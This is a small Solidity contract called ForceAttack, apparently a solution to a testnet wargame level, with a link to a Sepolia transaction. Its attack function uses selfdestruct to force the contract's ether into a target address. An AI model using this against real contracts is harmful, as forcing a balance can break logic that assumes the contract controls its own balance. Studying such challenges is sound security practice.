// SPDX-License-Identifier: MIT
// https://sepolia.etherscan.io/tx/0xfb6fdb12bb3c465563ebbc3710632ffef5a91f275932549158f09410e13b92be

pragma solidity ^0.8.0;

contract ForceAttack {
    constructor() public payable {
    }

    function attack(address _contractAddr) public {
        selfdestruct(payable(_contractAddr));
    }
}